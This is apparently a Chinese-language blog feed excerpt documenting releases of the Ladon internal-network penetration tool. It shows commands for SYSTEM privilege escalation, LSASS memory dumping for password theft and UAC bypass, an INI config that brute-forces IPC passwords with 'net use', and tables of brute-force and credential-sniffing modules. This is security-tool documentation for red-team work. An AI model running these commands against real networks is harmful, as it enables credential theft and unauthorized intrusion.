<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Notepad++ 修复被 CIA 利用的 DLL 劫持<br><a href="https://www.sohu.com/a/129080133_466846" target="_blank" rel="noopener">https://www.sohu.com/a/129080133_466846</a><br>[提权]Notepad++ DLL劫持漏洞<br><a href="https://bbs.mayidui.net/t219-e.html" target="_blank" rel="noopener">https://bbs.mayidui.net/t219-e.html</a></p>
]]></content>
      <categories>
        <category>持久化</category>
        <category>DLL劫持</category>
      </categories>
      <tags>
        <tag>DllHijack</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon 6.4新增Linux系统探测、管理员提权System降权</title>
    <url>/p/55476.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你还在为权限切换的问题而烦恼吗？SYSTEM权限下浏览器密码读取工具失效？SYS权限下系统自带NET USE命令连接IPC失效？<br>SYSTEM权限下截取不到目标桌面？ADMIN权限下打不开SYSTEM权限进程？如何切换各种权限测试工具？等这些都是权限问题，在XP和03用户权限和SYS权限都是同一个会话，所以远控可直接记录到，很多功能我们也没发现影响，直到WIN7微软为了这全，将会话进行隔离，我们会发现SYS权限会话为0，用户为1，这就是为什么以前sys权限控制WIN7机器远程桌面会黑屏的原因?Firefxo和Chrome采用了DBAPI加密，该加密需要对应用户会话信息才能解密，直接以SYSTEM权限启动发现解密失败。所以我们需要切换权限</p>
<h3 id="Ladon-6-4更新功能"><a href="#Ladon-6-4更新功能" class="headerlink" title="Ladon 6.4更新功能"></a>Ladon 6.4更新功能</h3><p>5.2<br>[u] 修复noping参数问题(误注释了一行代码导致)<br>4.27<br>[+] Ping/PingIP 仅ICMP探测IP速度快(3-6秒/C段,5.8前的OnlinePC)<br>[+] CheckDoor 检测后门(网上公开多年的)–OCI.DLL/5个注册表RUN<br>[u] OsScan 修复6.2 4.20后osscan无法使用的BUG<br>[+] ipcscan.ini INI插件之Ipc密码爆破(net use)<br>[+] smbscan.ini INI插件之Smb密码爆破(impacket)<br>[+] smbhash.ini INI插件之NtlmHash爆破(impacket)</p>
<p>4.26<br>[+]JspShell 横向移动连接内网webshell执行命令</p>
<p>4.20<br>[+] GetSystem 管理员/SYSTEM权限切换<br>[+] DumpLsass 导出Lsass内存文件<br>[u] OsScan新增SSH识别操作系统<br>[u] WebScan、SameWeb新增WebBanner<br>[+] WhatCms新增Banner、TP-Link WDR7300识别<br>[u] 修复6.3漏扫10、20等含0的C段</p>
<h3 id="提权-以SYSTEM权限执行"><a href="#提权-以SYSTEM权限执行" class="headerlink" title="提权 以SYSTEM权限执行"></a>提权 以SYSTEM权限执行</h3><p>命令：Ladon GetSystem cmd.exe<br>命令：Ladon GetSystem cmd.exe /system<br>命令：Ladon GetSystem cmd.exe lsass<br>可指定EXE或BAT，将以SYSTEM权限运行，如下图弹个CMD<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem.PNG"></p>
<p>注意：需管理员权限，若存在UAC可使用BypassUac获取管理员</p>
<p>当然也可以使用系统AT、SCHTASKS等命令获取SYSTEM权限，不担心被杀，只是麻烦点，看Ladom多简单</p>
<h3 id="降权-以用户权限执行"><a href="#降权-以用户权限执行" class="headerlink" title="降权 以用户权限执行"></a>降权 以用户权限执行</h3><p>SYSTEM权限下并不是什么都可以做，比如大家用Ladon或其它工具弹出个SYS权限CMD，再试一下系统自带的NET USE命令连接IPC看提示什么，你会发现明明密码是正确的但是却提示错误。为何需提权、降权我在14年已发布<br>命令：Ladon GetSystem cmd.exe /user<br>命令：Ladon GetSystem cmd.exe explorer<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/GetSystem2.PNG"></p>
<p>PS: 当然也可以切换至任意权限，指定对应进程即可，如降权到服务权限等</p>
<h3 id="DumpLsass内存密码"><a href="#DumpLsass内存密码" class="headerlink" title="DumpLsass内存密码"></a>DumpLsass内存密码</h3><p>Dump Lsass内存文件，取回本地读取密码，无需免杀MIMI<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/DumpLsass.PNG"></p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>命令: Ping 或 PingIP</p>
<p>仅ICMP协议探测存活主机（速度快3-6秒/ C段，5.8版本前的OnlinePC）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PingIP.PNG"></p>
<h3 id="Ipc密码爆破"><a href="#Ipc密码爆破" class="headerlink" title="Ipc密码爆破"></a>Ipc密码爆破</h3><p>INI插件：调用系统net use命令进行IPC爆破，由于系统限制只能连接一个，因此只能验证一个密码结束后，才能对下一个密码进行验证，而且必须删除连接，以上因素导致用系统命令爆破速度会很慢，因为你无法多线程一下就验证多个密码，所以Ladon内置模块不再保留IpcScan，使用分破4万密码的SmbScan可快速验证密码或者调用impacket的smbexec验证速度要比net use也快很多。</p>
<p>PS：此模块的存在主要是用于针对2003或XP系统的Ipc爆破，远程为Win7后系统推荐使用内置SmbScan爆破</p>
<p>ipcscan.ini</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force IPC(445) PassWord </span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=net use \\<span class="variable">$ip</span>$ /user:<span class="variable">$user</span>$ <span class="variable">$pass</span>$ &amp; net use \\<span class="variable">$ip</span>$ /del</span><br><span class="line"><span class="comment">#isok=The command completed successfully</span></span><br><span class="line">isok=命令成功完成</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>扫描C段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/c ipcscan.ini</span><br></pre></td></tr></table></figure>

<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/INI_ipcscan.PNG"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>提权</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon中28种探测存活主机方法(含绕过防火墙探测)</title>
    <url>/p/48225.html</url>
    <content><![CDATA[<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内网渗透中，最重要的一步就是探测在线机器，只有先探测到机器<br>接下来才是探测操作系统、扫描端口服务、开放WEB、扫描漏洞等。<br>目标不开机，你搞啥呢？当然也有一种情况，目标开机但却扫不到<br>这是因为目前大部份扫描器使用PING扫描，而防火墙默认是拦截的<br>默认条件下也不放行其它端口，比如SMB、RDP、HTTP等协议也不行<br>那能不能在防火墙完全防护状态下探测存活机器呢？答案是有的。</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Win7-A: 192.168.1.20 测试防火墙<br>Win7-B: 192.168.1.7  Ladon扫描器</p>
<p>实验1：A机器关闭防火墙<br>实验2：A机器开启防火墙<br>实验3：A机器关机</p>
<p>PS：整个过程中B机器防火墙需关闭，因为要保证所有协议都能进出B机器<br>才能测试防火墙开启或关闭的情况下，分别有哪些协议可以探测存活主机</p>
<h3 id="A关闭防火墙"><a href="#A关闭防火墙" class="headerlink" title="A关闭防火墙"></a>A关闭防火墙</h3><p>ICMP协议可达目标机器，即可PING通A机器<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>=============================================<br>OnlinePC:5</p>
<h3 id="A开启防火墙"><a href="#A开启防火墙" class="headerlink" title="A开启防火墙"></a>A开启防火墙</h3><p>ICMP协议不可达目标机器，即无法PING通A机器，但是MAC可以<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br> MAC: 192.168.1.20      00-0C-00-00-00-50                       VMware<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:6</p>
<h3 id="A机器关机"><a href="#A机器关机" class="headerlink" title="A机器关机"></a>A机器关机</h3><p>A机器关机后，发现无法探测MAC，说明能获取到MAC，机器肯定在线<br>Ladon 192.168.1.1/24 OnlinePC<br>=============================================<br>ICMP: 192.168.1.7       00-0C-00-00-00-90       Win-K8gege      VMware<br>ICMP: 192.168.1.1       94-28-00-00-00-4E                       NewH3C<br>ICMP: 192.168.1.4       00-0C-00-00-00-1C                       VMware<br>ICMP: 192.168.1.30      08-1F-00-00-00-EA                       Tp-Link<br>ICMP: 192.168.1.2       38-AD-00-00-00-1F                       NewH3C<br>=============================================<br>OnlinePC:5</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>开机状态下，开启系统防火墙后，无法PING通机器（默认配置）<br>但可获取远程机器MAC，因此可通过MAC探测目标主机是否存活</p>
<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>1.有人问我Ladon扫描出来的存活机器，为何PING不通呢?是不是不准？<br>答：首先机器存活，但相关端口未开放，如3389没开,你当然连不上。<br>同理防火墙默认根本不允许ICMP协议通过，你PING不通很正常。Ladon<br>通过其它方式探测到存活，而非单纯的ICMP，PING不通并不代表关机<br>上面的实验结果已充分说明，用其它工具扫描可能会漏掉禁PING机器</p>
<p>2.有人问我为什么新版的OnlinePC比之前慢了，以前3秒可扫一个C段。<br>再重复一次，Ladon的OnlinePC不只是单纯的通过ICMP检测存活主机。<br>打个比方一个人自己开车去北京，中途车坏了他就不去了，事情结束<br>如果车坏了，找人来修或换乘轮船，最后到达北京时间是不是多了。<br>新版的先PING机器,不通并没有结束，而是再尝试使用其它协议探测<br>最简单的一个问题，你是想要扫描结果更准更多，还是结果少速度快<br>再者以前可能3秒至几秒，现在可能几秒至13秒，才多几秒钟也不慢啊</p>
<p>以上两个问题是我发此文章的主要原因，怕还会有很多人问同样的问题</p>
<h3 id="28种方法"><a href="#28种方法" class="headerlink" title="28种方法"></a>28种方法</h3><p>Ladon以下模块均可用于探测存活主机，不要死板的只用OnlinePC<br>或者只用其它只是用PING来扫描的工具，得到的结果错过很多机器<br>可根据实际情况使用以下模块探测存活主机，如WAF禁用HTTP协议<br>采用HTTP协议的模块就不要用了，即便同样是HTTP，模块结果不同<br>如WhatCMS识别到CMS才回显，WebScan还会返回HttpBanner。<br>所以同个协议，有些模块扫不出东西，不代表防火墙禁止该协议。</p>
<p>如大家最容易理解的扫445端口发现不开放，不代表TCP协议禁用<br>因为人家怕你用MS17010漏洞一键GETSHELL，所以禁止了共享而已<br>如果要精准探测存活主机，就得使用多个方式才能深入拓展内网</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>采用协议</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>OnlinePC</td>
<td>存活主机信息</td>
<td>ICMP、MAC、DNS</td>
<td>Ladon 192.168.1.1/24 OnlinePC</td>
</tr>
<tr>
<td>2</td>
<td>OnlineIP</td>
<td>存活主机(IP)</td>
<td>ICMP、MAC、DNS</td>
<td>Ladon 192.168.1.1/24 OnlineIP</td>
</tr>
<tr>
<td>3</td>
<td>UrlScan</td>
<td>URL域名扫描</td>
<td>HTTP</td>
<td>Ladon 192.168.1.1/24 UrlScan</td>
</tr>
<tr>
<td>4</td>
<td>SameWeb</td>
<td>同服域名扫描</td>
<td>HTTP</td>
<td>Ladon 192.168.1.1/24 SameWeb</td>
</tr>
<tr>
<td>5</td>
<td>WebScan</td>
<td>Web信息扫找</td>
<td>HTTP</td>
<td>Ladon 192.168.1.1/24 WebScan</td>
</tr>
<tr>
<td>6</td>
<td>HostIP</td>
<td>主机名解析</td>
<td>DNS</td>
<td>Ladon Win-K8gege HostIP</td>
</tr>
<tr>
<td>7</td>
<td>DomainIP</td>
<td>域名解析</td>
<td>DNS</td>
<td>Ladon k8gege.org DomainIP</td>
</tr>
<tr>
<td>8</td>
<td>OsScan</td>
<td>操作系统版本</td>
<td>MAC、DNS、SMB、HTTP、RDP、TCP等</td>
<td>Ladon 192.168.1.1/24 OsScan</td>
</tr>
<tr>
<td>9</td>
<td>PortScan</td>
<td>扫描Banner</td>
<td>TCP</td>
<td>Ladon 192.168.1.1/24 PortScan</td>
</tr>
<tr>
<td>10</td>
<td>WhatCMS</td>
<td>Web指纹识别</td>
<td>HTTP</td>
<td>Ladon 192.168.1.1/24 WhatCMS</td>
</tr>
<tr>
<td>11</td>
<td>CiscoScan</td>
<td>思科扫描</td>
<td>HTTP、TCP</td>
<td>Ladon 192.168.1.1/24 CiscoScan</td>
</tr>
<tr>
<td>12</td>
<td>EnumMssql</td>
<td>MSSQL主机</td>
<td>MSSQL</td>
<td>Ladon EnumMssql</td>
</tr>
<tr>
<td>13</td>
<td>EnumShare</td>
<td>共享主机</td>
<td>SMB</td>
<td>Ladon EnumShare</td>
</tr>
<tr>
<td>14</td>
<td>LdapScan</td>
<td>LDAP主机/389端口/密码爆破</td>
<td>LDAP、TCP</td>
<td>Ladon 192.168.1.1/24 LdapScan</td>
</tr>
<tr>
<td>15</td>
<td>FtpScan</td>
<td>FTP主机/21端口/密码爆破</td>
<td>FTP、TCP</td>
<td>Ladon 192.168.1.1/24 FtpScan</td>
</tr>
<tr>
<td>16</td>
<td>SmbScan</td>
<td>445端口/密码爆破</td>
<td>SMB、TCP</td>
<td>Ladon 192.168.1.1/24 SmbScan</td>
</tr>
<tr>
<td>17</td>
<td>WmiScan</td>
<td>135端口/密码爆破</td>
<td>WMI、TCP</td>
<td>Ladon 192.168.1.1/24 WmiScan</td>
</tr>
<tr>
<td>18</td>
<td>SmbHash</td>
<td>445端口/密码爆破</td>
<td>SMB、TCP</td>
<td>Ladon 192.168.1.1/24 SmbHash</td>
</tr>
<tr>
<td>19</td>
<td>WmiHash</td>
<td>135端口/密码爆破</td>
<td>WMI、TCP</td>
<td>Ladon 192.168.1.1/24 WmiHash</td>
</tr>
<tr>
<td>20</td>
<td>SshScan</td>
<td>22端口/密码爆破</td>
<td>SSH、TCP</td>
<td>Ladon 192.168.1.1/24 SshScan</td>
</tr>
<tr>
<td>21</td>
<td>MssqlScan</td>
<td>1433端口/密码爆破</td>
<td>MSSQL、TCP</td>
<td>Ladon 192.168.1.1/24 MssqlScan</td>
</tr>
<tr>
<td>22</td>
<td>OracleScan</td>
<td>1521端口/密码爆破</td>
<td>Oracle、TCP</td>
<td>Ladon 192.168.1.1/24 OracleScan</td>
</tr>
<tr>
<td>23</td>
<td>MysqlScan</td>
<td>3306端口/密码爆破</td>
<td>MYSQL、TCP</td>
<td>Ladon 192.168.1.1/24 MysqlScan</td>
</tr>
<tr>
<td>24</td>
<td>VncScan</td>
<td>5900端口/密码爆破</td>
<td>VNC、TCP</td>
<td>Ladon 192.168.1.1/24 VncScan</td>
</tr>
<tr>
<td>25</td>
<td>MS17010</td>
<td>MS17010漏洞检测</td>
<td>TCP、SMB</td>
<td>Ladon 192.168.1.1/24 MS17010</td>
</tr>
<tr>
<td>26</td>
<td>AdiDnsDump</td>
<td>域内存活机器</td>
<td>DNS、LDAP</td>
<td>Ladon AdiDnsDump 域机器IP</td>
</tr>
<tr>
<td>27</td>
<td>FtpSniffer</td>
<td>Ftp密码嗅探</td>
<td>FTP</td>
<td>Ladon FtpSniffer 192.168.1.8</td>
</tr>
<tr>
<td>28</td>
<td>HttpSniffer</td>
<td>HTTP密码嗅探</td>
<td>HTTP</td>
<td>Ladon HTTPSniffer 192.168.1.8</td>
</tr>
</tbody></table>
<p>PS: Ladon 6.2开始密码爆破模块，在无帐密文件的情况下，仅探测协议或对应端口<br>当然所有密码爆破均可自定义端口爆破，但自定义端口可能只支持一台不支持批量<br>具体看Ladon对应模块的详细文档,嗅探模块嗅探出HTTP或FTP帐密同时也证明其存活</p>
<h3 id="Browser协议"><a href="#Browser协议" class="headerlink" title="Browser协议"></a>Browser协议</h3><p>无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2-12分钟<br>除了上述方法外，Browser协议也可以用于探测存活主机，不过是基于嗅探<br>基于Browser协议探测内网主机，详见：<a href="http://k8gege.org/p/16b5ff0b.html">http://k8gege.org/p/16b5ff0b.html</a></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>主机发现</category>
        <category>内网渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon 6.2新增Ntlm Hash爆破每分钟可破4万个密码</title>
    <url>/p/39070.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>天下武功,无坚不破,唯快不破。扫描速度 SMB &gt; Wmi ，但是SMB通不代表WMI通。<br>每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。</p>
<h3 id="Ladon6-2更新功能"><a href="#Ladon6-2更新功能" class="headerlink" title="Ladon6.2更新功能"></a>Ladon6.2更新功能</h3><p>ID | 模块名称 |  功能说明  | 返回结果<br>-|-|-|-|-<br>0 | <a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a> | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商<br>1 | <a href="http://k8gege.org/p/39070.html">SmbHashScan</a>  |  SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>2 | <a href="http://k8gege.org/p/39070.html">WmiHashScan</a>  |  WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>3 | <a href="http://k8gege.org/p/39070.html">BypassUac</a>   | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\1.exe<br>4 | <a href="http://k8gege.org/p/39070.html">EnableDotNet</a>   | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet<br>5 | <a href="http://k8gege.org/p/39070.html">gethtml</a>   | 获取内网站点HTML源码 | Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br>6 | <a href="http://k8gege.org/p/39070.html">AdiDnsDump</a>  | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名<br>7 | <a href="http://k8gege.org/p/39070.html">LdapScan</a>  | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器<br>8 | <a href="http://k8gege.org/p/39070.html">FtpScan</a>  | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器<br>9| <a href="http://k8gege.org/p/c5430395.html">Ladon.cna</a> | CobaltStrike 3.x-4.0右键菜单 | 一键扫描内网<br>10 命令支持CIDR格式IP扫描<br>11 INI配置支持自定义密码爆破<br>12 PortScan命令行支持自定义端口</p>
<h3 id="BUG修复"><a href="#BUG修复" class="headerlink" title="BUG修复"></a>BUG修复</h3><p>修复SmbScan遇到%非数字密码停止的BUG<br>修复一些模块扫描TXT列表崩溃的BUG<br>修复LdapScan扫描check.txt只检测一个的bug</p>
<h3 id="SmbHash密码爆破"><a href="#SmbHash密码爆破" class="headerlink" title="SmbHash密码爆破"></a>SmbHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/smbhash.PNG"></p>
<h3 id="WmiHash密码爆破"><a href="#WmiHash密码爆破" class="headerlink" title="WmiHash密码爆破"></a>WmiHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p>
<h3 id="LDAP服务器识别"><a href="#LDAP服务器识别" class="headerlink" title="LDAP服务器识别"></a>LDAP服务器识别</h3><p>目录下无帐密或相关文件时，使用LDAP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan0.PNG"></p>
<h3 id="Ftp服务器识别"><a href="#Ftp服务器识别" class="headerlink" title="Ftp服务器识别"></a>Ftp服务器识别</h3><p>目录下无帐密或相关文件时，使用FTP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/FtpScan0.PNG"></p>
<h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>详见：<a href="http://k8gege.org/p/53177.html">http://k8gege.org/p/53177.html</a><br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
<h3 id="OnlinePC存活主机"><a href="#OnlinePC存活主机" class="headerlink" title="OnlinePC存活主机"></a>OnlinePC存活主机</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p>
<h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p>命令行支持自定义端口，而不是非要ports.txt指定端口<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PortScan6.2.PNG"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>Kali</category>
        <category>密码</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
        <tag>Scanner</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon for MacOS</title>
    <url>/p/60379.html</url>
    <content><![CDATA[<p><img alt="Ladon" data-original="http://k8gege.org/k8img/Ladon/Dragon.jpg"></p>
<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Ladon" data-original="https://img.shields.io/badge/Ladon-5.8-yellowgreen"></a> <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener"><img alt="Bin" data-original="https://img.shields.io/badge/Ladon-Bin-ff69b4"></a> <a href="https://github.com/k8gege/Ladon/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/Ladon"></a> <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/Ladon"></a><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/Ladon"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在尘封已久的笔记本上安装mono后测试Ladon，确实支持苹果系统。当初没环境一直没测，和大家说理论上支持，现已证实。</p>
<p>测试环境：<br>Mac 10.15.3<br>mono 6.6.0.166<br>一不小心装的都是最新版，大家也可以在现有版本上测试，应该都是支持的。<br>使用方法和kali下使用一样，下载KaliLadon将其改名Ladon，在执行Ladon时在前面加上mono即可</p>
<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
<h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>Mac 10.15.3<br>mono 6.6.0.166</p>
<h3 id="安装mono"><a href="#安装mono" class="headerlink" title="安装mono"></a>安装mono</h3><p>linux下需mono运行环境，Kali和Ubuntu安装命令通用。<br>其它系统未进行测试，喜欢用其它Linux系统自行测试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install mono-runtime</span><br></pre></td></tr></table></figure>

<h3 id="运行Ladon"><a href="#运行Ladon" class="headerlink" title="运行Ladon"></a>运行Ladon</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mono Ladon OnlinePC</span><br></pre></td></tr></table></figure>

<h3 id="可用功能"><a href="#可用功能" class="headerlink" title="可用功能"></a>可用功能</h3><p>由于mono的兼容性问题，不保证苹果下所有功能均可用<br>就对于Ladon功能的测试来看Kali的兼容性要比Ubuntu好<br>测试发现有些功能的稳定性以及速度没有Windows系统快<br>未列功能系未测试或暂不可用功能，使用前请先看说明<br>在Kali 2019.4下测试，Ladon支持以下所列的27种功能<br>=============================================</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>WebDir</td>
<td>Web目录扫描</td>
</tr>
<tr>
<td>2</td>
<td>UrlScan</td>
<td>URL域名扫描（不验IP）</td>
</tr>
<tr>
<td>3</td>
<td>PhpStudyPoc</td>
<td>PhpStudy后门扫描</td>
</tr>
<tr>
<td>4</td>
<td>WebScan</td>
<td>Web信息扫描</td>
</tr>
<tr>
<td>5</td>
<td>MysqlScan</td>
<td>Mysql口令检测</td>
</tr>
<tr>
<td>6</td>
<td>OracleScan</td>
<td>Oracle口令检测</td>
</tr>
<tr>
<td>7</td>
<td>VncScan</td>
<td>Vnc口令检测</td>
</tr>
<tr>
<td>8</td>
<td>HttpDownLoad</td>
<td>Http下载</td>
</tr>
<tr>
<td>9</td>
<td>FtpDownLoad</td>
<td>Ftp下载</td>
</tr>
<tr>
<td>10</td>
<td>WhatCMS</td>
<td>75种CMS识别</td>
</tr>
<tr>
<td>11</td>
<td>FtpScan</td>
<td>Ftp口令检测</td>
</tr>
<tr>
<td>12</td>
<td>PortScan</td>
<td>PortScan端口扫描</td>
</tr>
<tr>
<td>13</td>
<td>SmbScan</td>
<td>Smb口令检测</td>
</tr>
<tr>
<td>14</td>
<td>SameWeb</td>
<td>站点域名扫描（验证IP）</td>
</tr>
<tr>
<td>15</td>
<td>MS17010</td>
<td>MS17010漏洞扫描</td>
</tr>
<tr>
<td>16</td>
<td>OnlinePC</td>
<td>存活主机扫描</td>
</tr>
<tr>
<td>17</td>
<td>OnlineIP</td>
<td>存活主机IP扫描</td>
</tr>
<tr>
<td>18</td>
<td>HostIP</td>
<td>主机名解析IP</td>
</tr>
<tr>
<td>19</td>
<td>DomainIP</td>
<td>子域名解析IP</td>
</tr>
<tr>
<td>20</td>
<td>EnBase64</td>
<td>批量Base64密码加密</td>
</tr>
<tr>
<td>21</td>
<td>DeBase64</td>
<td>批量Base64密码解密</td>
</tr>
<tr>
<td>22</td>
<td>EnHex</td>
<td>批量Hex密码加密</td>
</tr>
<tr>
<td>23</td>
<td>DeHex</td>
<td>批量Hex密码解密</td>
</tr>
<tr>
<td>24</td>
<td>OsScan</td>
<td>系统版本探测</td>
</tr>
<tr>
<td>25</td>
<td>SubDomain</td>
<td>子域名爆破</td>
</tr>
<tr>
<td>26</td>
<td>SshScan</td>
<td>SSH口令检测</td>
</tr>
<tr>
<td>27</td>
<td>*.ps1</td>
<td>无PowerShell执行脚本</td>
</tr>
</tbody></table>
